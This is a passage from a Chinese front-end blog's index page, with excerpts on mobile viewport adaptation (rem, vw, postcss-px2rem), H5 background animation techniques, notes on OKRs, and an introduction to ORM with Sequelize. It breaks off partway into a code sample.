<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong><code>width=device-width</code>：</strong> 把布局视口设置成为浏览器（屏幕）的宽度。</p>
<p><strong><code>initial-scale=1</code> ：</strong>初始缩放的比例是1，使用它的时候，同时也会将布局视口的尺寸设置为初始缩放比例后的尺寸。而缩放的尺寸就是基于屏幕的宽度来的，也就起到了和<code>width=device-width</code>同样的效果。</p>
<p>每个移动设备浏览器中都有一个理想的宽度，这个理想的宽度是指css中的宽度，跟设备的物理宽度没有关系，在css中，这个宽度就相当于100%的所代表的那个宽度（这个其实就是<code>devices-width</code>）。</p>
<p>我们可以用<code>meta</code>标签把<code>viewport</code>的宽度设为那个理想的宽度，如果不知道这个设备的理想宽度是多少，那么用<code>device-width</code>这个特殊值就行了，同时<code>initial-scale=1</code>也有把<code>viewport</code>的宽度设为理想宽度的作用。</p>
<p>为什么需要有理想的<code>viewport</code>呢？比如一个分辨率为<code>320x480</code>的手机理想<code>layout viewport</code>的宽度是<code>320px</code>，而另一个屏幕尺寸相同但分辨率为<code>640x960</code>的手机的理想<code>layout viewport</code>宽度也是为<code>320px</code>，那为什么分辨率大的这个手机的理想宽度要跟分辨率小的那个手机的理想宽度一样呢？</p>
<p>这是因为，只有这样才能保证同样的网站在不同分辨率的设备上看起来都是一样或差不多的。实际上，现在市面上虽然有那么多不同种类不同品牌不同分辨率的手机，但它们的理想<code>viewport</code>宽度归纳起来无非也就 <code>320、360、384、400</code>等几种，都是非常接近的，理想宽度的相近也就意味着我们针对某个设备的理想<code>viewport</code>而做出的网站，在其他设备上的表现也不会相差非常多甚至是表现一样的。</p>
<h2 id="三、移动端适配方案"><a href="#三、移动端适配方案" class="headerlink" title="三、移动端适配方案"></a>三、移动端适配方案</h2><p>在移动端上，有了<code>layout viewport</code>的固定宽度之后，再进行移动端适配就不再是难事，简单总结了如下几种移动端适配的方法：</p>
<h3 id="3-1、flex弹性盒模型实现的移动端适配"><a href="#3-1、flex弹性盒模型实现的移动端适配" class="headerlink" title="3.1、flex弹性盒模型实现的移动端适配"></a>3.1、flex弹性盒模型实现的移动端适配</h3><p>以淘宝移动端页面为例：<a target="_blank" rel="noopener" href="https://main.m.taobao.com/index.html">https://main.m.taobao.com/index.html</a></p>
<p>通过将盒子设置成<code>flex</code>布局以及<code>width:100%</code>，根据需要来设置<code>justify-content</code>以及<code>align-items</code>来对齐居中等，实现在不同屏幕尺寸的移动端下的适配。</p>
<p>在需要适配的地方使用弹性盒模型以及百分比，在不需要适配的地方使用px，举个例子，底部tap就是适配的，而中间的导航，如”天猫新品，今日爆款“的图标块是原始<code>px</code>尺寸。</p>
<img src="/images/viewport/9.png" width = "400" alt="1" align=center />



<p>这种适配方案在手机端是OK的，但一旦转换到ipad端….，如下图所示，中间的导航栏由于<code>div</code>宽度过长，而其中的图标大小还是原始尺寸，导致盒子过大，图标无法填充满整个盒子，更别说是切换分页了（这个盒子中是有分页器的）</p>
<img src="/images/viewport/10.png" width = "400" alt="1" align=center />

<p><strong>这种适配方案的优缺点：</strong></p>
<p><strong>优点：</strong><br>实现简单便捷，<code>flex+百分比/flex+vw</code>灵活方便，无需引入其他库便可以实现大部分手机的屏幕适配<br><strong>缺点：</strong><br>针对于平板类的移动端，还需要另外做适配才能兼容，比较繁琐</p>
<h3 id="3-2、rem-px2rem适配方案"><a href="#3-2、rem-px2rem适配方案" class="headerlink" title="3.2、rem+px2rem适配方案"></a>3.2、rem+px2rem适配方案</h3><pre><code>在W3C官网上是这样描述rem的——“font size of the root element” 。
</code></pre>
<p>基本思路：</p>
<p>假如说我们的设计稿为<code>750px</code>，现在把设计稿分成<code>10</code>份，一份就为<code>75px</code>。</p>
<p>同样，获取到移动端屏幕的宽度，将其分成十份，并且将每份的大小设置成<code>1rem</code>，也就是设置<code>html</code>的<code>font-size</code>。设置<code>div</code>大小时，便可用<code>rem</code>进行设置，比如，设计稿中一个<code>Img</code>是<code>75 x 75</code>，代码中就可以设置这个<code>img</code>为<code>1rem</code>，即<code>img</code>的宽度是设计稿的<code>1/10</code>，对应的比例在手机中也就是屏幕宽度的<code>1/10</code>，也就是<code>1rem</code>。分成几份全由自己来决定，可以分成<code>10</code>份，也可以分成<code>20</code>份，等等。</p>
<p>这样可以实现适配，但是问题在于，每次写css的宽高时，都需要通过自己再进行计算转换成<code>rem</code>，比如如果有个<code>img</code>是<code>50x50</code>像素，它在设计稿中的比例是 <code>50/75 = 0.667</code>份，相当于在代码中我们需要写<code>0.667rem</code>，这其实是非常繁琐且低效的。</p>
<p>但是，现有工具可以帮我们解决这个问题：<code>postcss-px2rem</code>。我们在写代码的时候还是可以用<code>px</code>，设计稿中写了多少<code>px</code>我们代码中就写多少<code>px</code>，在代码编译阶段，<code>postcss-px2rem</code>就会将<code>px</code>编译成相应的<code>rem</code>，这样我们就无需手动去换算，这是一种比较成熟的移动端适配方案。（这里不深入探究<code>1px</code>的问题，解决<code>1px</code>问题需要配合<code>scale</code>以及<code>dpr</code>进行）</p>
<p>下面以<code>vue</code>项目且<code>750px</code>设计稿为例：</p>
<p>我们设定设计稿<code>html</code>的<code>fontSize = 75px</code>，则<code>1rem = 75px</code>(分成10份)，体现在<code>postCss-px2rem</code>中就是<code>remUnit: 75</code>。这时在代码中写<code>1px</code>，代码编译后会转换成<code> 1/75 = 0.01333rem</code>，而这个<code>0.01333rem</code>是相对于移动端屏幕的，</p>
<p>举个例子：如果移动端屏幕为<code>375px</code>，且我们对移动端网页的<code>html</code>设置了<code>fontSize = 375 / 10 = 37.5px</code>，则<code>0.013333rem = 37.5 * 0.013333 = 0.5px</code>，其比例和设计稿是一致的，所以显示在屏幕中也就是正常的。</p>
<p>设置<code>font-size</code>的代码如下（引入的方式按需而定，比如这段代码可以通过一个<code>script</code>标签内联在<code>app.html</code>）：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> width = <span class="built_in">document</span>.documentElement.clientWidth;</span><br><span class="line"><span class="keyword">const</span> html = <span class="built_in">document</span>.getElementByTagName(<span class="string">&#x27;html&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">html.style.fontSize = width / <span class="number">10</span> + <span class="string">&#x27;px&#x27;</span>;</span><br></pre></td></tr></table></figure>


<p>配置<code>postCss-px2rem</code>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// postcss.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="attr">plugins</span>: &#123;</span><br><span class="line">        <span class="attr">autoprefixer</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&#x27;postcss-px2rem&#x27;</span>: &#123;</span><br><span class="line">            <span class="attr">remUnit</span>: <span class="number">75</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="3-3、vw-px2rem适配方案"><a href="#3-3、vw-px2rem适配方案" class="headerlink" title="3.3、vw+px2rem适配方案"></a>3.3、<code>vw+px2rem</code>适配方案</h3><p>在移动端适配发展的初期，浏览器对<code>vw</code>的兼容性相比于<code>rem</code>是差很多的，但是随着浏览器的发展，慢慢地对<code>vw</code>的兼容相比于以前有了天翻地覆的变化</p>
<p>回想<code>rem</code>适配，若是将设计稿分成100份的时候，其实<code>1rem</code>也就对应了<code>1vw</code>，两者的原理是差不多的，<code>vw</code>的好处就体现在其不再需要引入<code>js</code>，直接通过css代码便可以设置，</p>
<p>代码如下：</p>
<img src="/images/viewport/11.png" width = "600" alt="1" align=center />

<p>其中，还是将设计稿分成了十份，如果设计稿为<code>1080px</code>，则一份为<code>108</code>像素，注意，这两个值是通过自己去设置的，并不是一定要这样设置，可以根据设计稿以及自己方便计算来设置；</p>
<p>设计稿的<code>html fontSize</code>设计成<code>1/10</code>的设计稿宽度<code>108</code>，所以<code>postCss-px2rem</code>中的<code>remUnit</code>就为<code>108</code>，相应的移动端页面中<code>1rem = 10vw</code>，相当于在<code>375</code>的屏幕中<code>1rem = 37.5px</code>。</p>
<p>同时，也可以利用<code>px2rem</code>工具，写代码时就可以直接利用<code>px</code>。</p>
<p><strong><u>参考文章：</u></strong></p>
<p><strong>viewport</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.quirksmode.org/mobile/viewports.html">A tale of two viewports — part one</a></p>
<p><a target="_blank" rel="noopener" href="https://www.quirksmode.org/mobile/viewports2.html">A tale of two viewports — part t</a></p>
<p><a target="_blank" rel="noopener" href="https://www.quirksmode.org/mobile/metaviewport/">Meta viewport</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/2050/p/3877280.html">移动前端开发之viewport的深入理解</a></p>
<p><strong>移动端适配</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/amfe/article/issues/17">使用Flexible实现手淘H5页面的终端适配</a></p>
<p><a target="_blank" rel="noopener" href="https://juejin.im/entry/5a9d07ee6fb9a028c149f55b">再聊移动端页面的适配</a></p>
</p>
      <div class="post-button"><a class="btn" href="/2021/05/08/viewport/" rel="noopener"><i class="fa fa-angle-double-right fa-fw"></i>Read More</a></div>
    </div>
  </div>
  <div class="lx-entry padding">
    <div>
      <h2 class="title"><a href="/2021/05/07/h5-bg-animation/">H5背景动效实现方案总结</a></h2>
      <span class="lx-post-detail"><i class="fa fa-calendar-o"></i> 2021-05-07</span>
      <p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通常来说，一个元素，动往往比静更能吸引用户眼球。针对于H5页面的背景，炫酷的背景动画特效能定向助力传播和品牌打造。本文将介绍几种常见的H5中背景动效的制作手法。</p>
<h2 id="一、GIF"><a href="#一、GIF" class="headerlink" title="一、GIF"></a>一、GIF</h2><p><code>gif</code>图片擅长于制作循环的小动画，使用<code>gif</code>有以下几个条件：</p>
<pre><code>1. 动画是循环的，首尾相接
2. 每次循环的时间必须要短，否则gif的资源会很大，影响页面的加载速度
</code></pre>
<p>来看一个OPPO开发者大会的例子：<a target="_blank" rel="noopener" href="https://open.oppomobile.com/odc20/mobile/">https://open.oppomobile.com/odc20/mobile/</a></p>
<img src="/images/h5-bg-animation/1.gif" width = "300" alt="1" align=center />

<p>后面的背景动效具体代码如下：</p>
<img src="/images/h5-bg-animation/2.png" width = "800" alt="1" align=center />

<p><code>img</code>中的<code>src</code>指向了一个<code>gif</code>。</p>
<p>这个<code>gif</code>体积大小为<code>1.8M</code>，时长为<code>1s</code>。</p>
<p>可以看到，虽然只有<code>1s</code>的<code>gif</code>，但体积大小已经到了<code>1.8M</code>，针对于H5页面来说已经挺大了。</p>
<p>所以，若不是简短的循环动画，不推荐使用<code>gif</code>方案。并且，在设计动效时，需要与美术同学沟通好，<br>不能让其随意发挥，不然可能最后拿到的<code>gif</code>资源过大，导致该方案行不通。</p>
<p><strong>关键点：循环，简短，体积小，时间短。</strong></p>
<p><strong>优点：实现简单，动画效果细腻</strong></p>
<p><strong>缺点：限制较多，资源较大，影响页面性能</strong></p>
<h2 id="二、帧动画"><a href="#二、帧动画" class="headerlink" title="二、帧动画"></a>二、帧动画</h2><p>帧动画的设计有如下两种，基本原理是一致的：</p>
<ol>
<li>通过一张张图片切换实现动画效果。在<code>vue</code>框架中，就可以先加载好图片，然后利用<code>v-show</code>进行图片切换</li>
<li>将逐帧图片放到一张长图中，利用<code>css</code>控制图片展示的位置，来实现动画的效果，这种方案需要设计配合输出一张帧动画长图</li>
</ol>
<h4 id="1、切换图片实现"><a href="#1、切换图片实现" class="headerlink" title="1、切换图片实现"></a>1、切换图片实现</h4><img src="/images/h5-bg-animation/3.gif" width = "300" alt="3" align=center />

<p>以上某次活动的效果<code>gif</code>图，图中闪电效果以及手机转动效果均是利用切换图片来实现的帧动画。</p>
<p>拿闪电效果举例：</p>
<ul>
<li>素材有以下4张图片</li>
</ul>
<img src="/images/h5-bg-animation/4.png" width = "100" alt="4" align=center />
<img src="/images/h5-bg-animation/5.png" width = "100" alt="4" align=center />
<img src="/images/h5-bg-animation/6.png" width = "100" alt="4" align=center />
<img src="/images/h5-bg-animation/7.png" width = "100" alt="4" align=center />


<ul>
<li>在页面启动时，可以在页面中创建6个<code>img</code>标签，并将各个图片的地址赋值给各个<code>img</code>的<code>src</code>属性，<br>并且这几个<code>img</code>的<code>display</code>都为<code>none</code>，不展示（也可以展示第一张作为过渡，等所有图片加载出来后再开始执行动画）</li>
<li>通过<code>setInterval</code>函数，控制好图片展示的时间以及切换，便可实现动画效果。</li>
</ul>
<h4 id="2、长图滑动图片实现"><a href="#2、长图滑动图片实现" class="headerlink" title="2、长图滑动图片实现"></a>2、长图滑动图片实现</h4><img src="/images/h5-bg-animation/10.png" width = "300" alt="4" align=center />



<p>上图的动画效果是利用一张等间距的动画分解逐帧图片（类似雪碧图），由<code>js</code>脚本模拟编写或是使用<code>css3</code>新属性<code>step()</code>制作而成的。</p>
<p><code>step()</code>在移动端的兼容性是很好的，但使用比较小众。逐帧动画和<code>GIF</code>动画的差别在于，<br>脚本可以控制逐帧动画的快慢和动作的暂停，而<code>GIF</code>动画无法在后期通过代码进行动画速率及透明度的修改。</p>
<p>以下是<code>CSS</code>代码的实现：</p>
<img src="/images/h5-bg-animation/11.png" width = "500" alt="4" align=center />

<p>通过<code>animation</code>属性控制背景图片展示的位置来实现帧动画效果。</p>
<p>以上两种方案都需要手头有帧动画的逐帧图片，若手上只有设计师给的动画效果视频怎么办？</p>
<p>这里有一个不错的网站推荐给大家：<a target="_blank" rel="noopener" href="https://www.img2go.com/convert-to-jpg%EF%BC%88%E5%82%BB%E7%93%9C%E5%BC%8F%E8%A7%86%E9%A2%91%E8%BD%AC%E5%B8%A7%E5%8A%A8%E7%94%BB%E5%9B%BE%E7%89%87%E5%B7%A5%E5%85%B7%EF%BC%89">https://www.img2go.com/convert-to-jpg（傻瓜式视频转帧动画图片工具）</a></p>
<p><strong>优点：兼容性好，实现难度不高</strong></p>
<p><strong>缺点：资源较大影响性能，动画可能不够细腻</strong></p>
<h2 id="三、SVG"><a href="#三、SVG" class="headerlink" title="三、SVG"></a>三、SVG</h2><img src="/images/h5-bg-animation/12.gif" width = "300" alt="4" align=center />

<p>上图是<code>SVG</code>实现的一个简单的背景动效，具体的实现难度与动画的复杂程度有关，<br>有兴趣的同学可以进一步研究<code>SVG</code>动画：<a target="_blank" rel="noopener" href="https://aotu.io/notes/2017/01/22/snapsvg/index.html">https://aotu.io/notes/2017/01/22/snapsvg/index.html</a></p>
<p><code>SVG</code>动画效果以线条、形状变化为主，需要根据具体的场景来决策是否要使用<code>svg</code>进行实现。</p>
<p><strong>优点：兼容性好，性能佳</strong></p>
<p><strong>缺点：实现复杂</strong></p>
<h2 id="四、video"><a href="#四、video" class="headerlink" title="四、video"></a>四、video</h2><p>使用<code>video</code>标签来设置背景的好处就在于：可以直接引入视频，且无需过多的代码设计，简单粗暴。<br>但由于H5端各个浏览器以及平台对video标签的处理不尽相同，且无法自动播放，还有可能被浏览器拦截，<br>所以<code>video</code>标签作为背景在PC端上使用得更多，H5端要使用的话必须要平台支持<code>video</code>标签自动播放。</p>
<p>比如在各个手机端的浏览器中基本上是无法自动播放的，而在应用商店或者某些平台的<code>webView</code>中，<br>是可以设置video自动播放，此时就能使用<code>video</code>标签作为背景，引入一个视频，使用方法也很简单：<br>设置一个<code>video</code>标签，配置一些相应的属性即可。<br>video标签的mdn文档：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video">https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video</a></p>
<p><strong>优点：实现简单</strong></p>
<p><strong>缺点：H5上对自动播放的兼容性差，无法自动播放时便无法使用此方法进行实现</strong></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上述简单总结阐述了四种背景动效的实现方案，分别是<code>gif</code>、<code>逐帧动画</code>、<code>SVG</code>、<code>video</code>，每种方案都有其相应的优缺点，具体的使用需要根据具体场景去分析。</p>
<p>在制作背景动效的过程中作为开发人员有以下几点需要注意：</p>
<ul>
<li>有问题及时与设计师沟通，效果无法实现的时候尝试与设计师探讨B方案，比如换用一种效果，或者以可以实现的效果平缓过渡，保证用户体验的同时不会严重影响视觉效果</li>
<li>在设计师出完设计动效之后，必须进行评审，明确通知产品以及设计师哪些效果可以做，哪些效果做起来成本会很高，从项目初期就确定好整体的效果以及实现方案。这样做是为了后续保证项目质量以及不会因为动效实现难而导致延期或者不做</li>
<li>具体的动效也需要根据具体的场景进行分析，这就要求开发人员需要有足够的动效设计开发经验，对所需要做的动效心里有个尺度</li>
</ul>
</p>
      <div class="post-button"><a class="btn" href="/2021/05/07/h5-bg-animation/" rel="noopener"><i class="fa fa-angle-double-right fa-fw"></i>Read More</a></div>
    </div>
  </div>
  <div class="lx-entry padding">
    <div>
      <h2 class="title"><a href="/2021/05/05/okr-record/">OKR阅读心得</a></h2>
      <span class="lx-post-detail"><i class="fa fa-calendar-o"></i> 2021-05-05</span>
      <p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><code>OKR</code>全称是<code>Objective and key results</code>，目标与<code>**关键结果法**</code>。</p>
<p>它关注<code>目标</code>，是一套定义和跟踪目标及其完成情况的管理工具和方法。<u>目标是指你想完成什么事情</u>；<u>关键结果是确认你是否做到了这件事情</u>，即关键结果是对于目标实现的量化。</p>
<p>作者杜尔自己多年来使用<code>OKR</code>，还在不同规模和性质的企业和组织中推广<code>OKR</code>。他在本书里介绍了如何使用<code>OKR</code>，实现增长。他还邀请包括比尔·盖茨等在内的<code>OKR</code>的实践者。</p>
<p>以第一人称的方式，讲述自己使用<code>OKR</code>的故事，通过生动的案例，展示<code>OKR</code>的力量。</p>
<h3 id="OKR与KPI"><a href="#OKR与KPI" class="headerlink" title="OKR与KPI"></a><code>OKR</code>与<code>KPI</code></h3><p>其实一说到绩效考核，大家可能马上就会想起<code>KPI</code>，也就是关键绩效指标。这两个工具的区别在哪儿呢？最直接的区别是，<code>KPI</code>有明确的考核指标，跟奖金激励挂钩，但是<code>OKR</code>更侧重目标管理，</p>
<p>跟升职加薪没有直接关系。<code>KPI</code>是一种压力管理方法，能让你为了完成考核指标而埋头工作，但你有可能只顾得上完成指标，而不管实际效果。<code>OKR</code>则是一种愿景管理方法，让你工作时不会偏离方向，取得实实在在的进步。</p>
<h3 id="OKR特点"><a href="#OKR特点" class="headerlink" title="OKR特点"></a><code>OKR</code>特点</h3><p>关于<code>OKR</code>的一些特点：</p>
<h4 id="在设定OKR上："><a href="#在设定OKR上：" class="headerlink" title="在设定OKR上："></a>在设定<code>OKR</code>上：</h4><ul>
<li>要使目标具有使命感，意义感；</li>
<li>重要且具体，以结果导向</li>
<li>关键结果明确，有时间节点</li>
<li>具有挑战性</li>
</ul>
<h4 id="OKR的四大利器："><a href="#OKR的四大利器：" class="headerlink" title="OKR的四大利器："></a><code>OKR</code>的四大利器：</h4><ul>
<li>让整个组织聚焦在重要的事情上</li>
<li>对责任进行追踪</li>
<li>促进团队的协同</li>
<li>挑战不可能</li>
</ul>
<h4 id="OKR的使用："><a href="#OKR的使用：" class="headerlink" title="OKR的使用："></a><code>OKR</code>的使用：</h4><p>​    <u>围绕CFR展开（comversation, feedback, recognition）沟通、反馈、评价</u></p>
<p><strong>C：沟通</strong> - 不断围绕一个时间段内的<code>OKR</code>进行沟通，最终达成共识</p>
<p><strong>F：反馈</strong> - 根据<code>OKR</code>的进行进度不断反馈，追踪<code>OKR</code>的进展</p>
<p><strong>R：评价</strong> - 对<code>OKR</code>的关键结果完成情况评价，打分并总结。</p>
<h3 id="阅读《OKR》心得体会："><a href="#阅读《OKR》心得体会：" class="headerlink" title="阅读《OKR》心得体会："></a>阅读《OKR》心得体会：</h3><p>制定目标的过程应该极为小心，不可让目标太容易实现，也不可让目标过于宏达导致在规定的时间内无法实现而产生懈怠，所以目标的制定是<code>OKR</code>的难点之一。<br>所制定的目标必须具有挑战性，而不是日常反复的工作，是需要走出舒适区才能实现的目标。</p>
<p>要小心区别重要事件和紧急事件，很多容易先做紧急事件，而不紧急的重要事件一直被排在后面而导致最终没办法完成既定的目标。其实工作中很多这样的场景，<br>业务需求频繁导致需要把精力大部分放置于业务需求当中，于我目前而言，是好事，刚接手这一工作，最重要的就是熟悉业务，而熟悉业务最简单的方式就是<br>多做需求。但是实现业务需求对个人的提升是有瓶颈的，可能一两年后，如果没有补充自己的知识面，深究技术原理，仅停留在实现功能层面上的话，便很难再有提升。<br>所以，要合理分配精力，对业务需求保质保量，同时通过对重要事件的完成，提升自己，反向推动提升工作效率，两者相辅相成。</p>
<p>书中还有关于<code>OKR</code>的一点我觉得十分有价值，就是<code>OKR</code>是相当透明的，公司上下之间目标明确，每个人都可以看到任何人的<code>OKR</code>，一线人员可以不断调整自己的<code>OKR</code>与<br>公司<code>OKR</code>对齐，通过自己<code>OKR</code>的实现，来推动公司的<code>OKR</code>；而同事与同事之间也能相互了解对方正在做什么事情，相互配合，互相促进。这其实是共赢的，公司有提升，职员也有提升。</p>
</p>
      <div class="post-button"><a class="btn" href="/2021/05/05/okr-record/" rel="noopener"><i class="fa fa-angle-double-right fa-fw"></i>Read More</a></div>
    </div>
  </div>
  <div class="lx-entry padding">
    <div>
      <h2 class="title"><a href="/2021/05/03/orm/">ORM框架</a></h2>
      <span class="lx-post-detail"><i class="fa fa-calendar-o"></i> 2021-05-03</span>
      <p><h2 id="一、ORM简介"><a href="#一、ORM简介" class="headerlink" title="一、ORM简介"></a>一、ORM简介</h2><p><code>ORM</code>（对象关系映射，<code>Object relational mapping</code>，简称<code>ORM</code>）是一种为了解决业务中对象与关系数据库不匹配的现象而提出的框架技术，<code>ORM</code><br>通过使用描述对象和数据库之间映射的元数据，将业务逻辑中的对象持久化到关系数据库中。</p>
<pre><code>持久化：持久化是将程序数据在持久状态和瞬时状态间转换的机制，瞬时数据持久化为持久数据。通俗易懂地讲就是，业务中处理的对象数据发生改变，
</code></pre>
<p>需要将其同步到数据库中保存，即<code>持久化</code>。（比如内存中的数据，是不能永久保存的，持久化至数据库中，能够长久保存）</p>
<p>实现持久化最基本的方式就是硬编码：为每一种增删改查的需求写相应的代码。可想而知，这种方式存在很多不足的地方：</p>
<ul>
<li><p>缺乏弹性，一旦业务需求发生变更，就必须修改代码，扩展性以及可维护性差；</p>
</li>
<li><p>针对于每一种持久化需求，都需要写相应的代码，但很大一部分代码都是重复的；</p>
</li>
</ul>
<p>针对于以上问题，<code>ORM</code>框架就被提出来。<code>ORM</code>作为业务处理对象与数据库连接的桥梁，通过对象的语法，完成关系型数据库的操作技术。</p>
<p><code>ORM</code> 把数据库映射成对象。</p>
<ul>
<li><p>数据库的表（<code>table</code>） –&gt; 类（<code>class</code>）</p>
</li>
<li><p>记录（<code>record</code>，行数据）–&gt; 对象（<code>object</code>）</p>
</li>
<li><p>字段（<code>field</code>）–&gt; 对象的属性（<code>attribute</code>）</p>
</li>
</ul>
<p>举个例子：</p>
<p>sql查询语句如下，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, first_name, last_name, phone, birth_date, sex</span><br><span class="line"><span class="keyword">FROM</span> persons</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>业务逻辑中操作数据库代码如下：</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = db.execSql(sql);</span><br><span class="line">name = res[<span class="number">0</span>][<span class="string">&#x27;FIRST_NAME&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>改用<code>ORM</code>框架之后：</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = Person.get(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">let</span> name = p.first_name;</span><br></pre></td></tr></table></figure>

<p>通过以上代码对比，<code>ORM</code>的优点就凸显出来了：业务开发者不需要去碰SQL语句，只需要使用<code>ORM</code>提供的接口，直接对对象进行操作，就可以实现与数据库的交互，不需要关心数据库底层的增删改查SQL语句。</p>
<h2 id="二、ORM优缺点"><a href="#二、ORM优缺点" class="headerlink" title="二、ORM优缺点"></a>二、ORM优缺点</h2><p><code>ORM</code>的优点：</p>
<ul>
<li><p>数据模型都在一个地方定义，更容易更新和维护，也利于重用代码。</p>
</li>
<li><p><code>ORM</code> 有现成的工具，很多功能都可以自动完成，比如数据消毒、预处理、事务等等。</p>
</li>
<li><p>它迫使你使用 MVC 架构，<code>ORM</code> 就是天然的 Model，最终使代码更清晰。</p>
</li>
<li><p>基于 <code>ORM</code> 的业务代码比较简单，代码量少，语义性好，容易理解。</p>
</li>
<li><p>不必编写性能不佳的 SQL。</p>
</li>
</ul>
<p>但是<code>ORM</code>也有相应的缺点：</p>
<ul>
<li><p><code>ORM</code> 库不是轻量级工具，需要花很多精力学习和设置。</p>
</li>
<li><p>对于复杂的查询，<code>ORM</code> 要么是无法表达，要么是性能不如原生的 SQL。</p>
</li>
<li><p><code>ORM</code> 抽象掉了数据库层，开发者无法了解底层的数据库操作，也无法定制一些特殊的 SQL。</p>
</li>
</ul>
<h2 id="三、ORM框架"><a href="#三、ORM框架" class="headerlink" title="三、ORM框架"></a>三、ORM框架</h2><p>实用<code>ORM</code>框架：<a target="_blank" rel="noopener" href="https://sequelize.org/v5/">sequelize</a></p>
<p>连接数据库：</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Sequelize = <span class="built_in">require</span>(<span class="string">&#x27;sequelize&#x27;</span>);</span><br><span class="line"><span class="comment">// option1:</span></span><br><span class="line">sequelize = <span class="keyword">new</span> Sequelize(<span class="string">&#x27;database&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="attr">dialect</span>: <span class="string">&#x27;mysql&#x27;</span> | <span class="string">&#x27;mariadb&#x27;</span> | <span class="string">&#x27;postgres&#x27;</span> | <span class="string">&#x27;mssql&#x27;</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="comment">// option2:</span></span><br><span class="line"><span class="keyword">const</span> sequelize = <span class="keyword">new</span> Sequelize(<span class="string">&#x27;mysql://root:asd123@localhost:3306/mydb&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 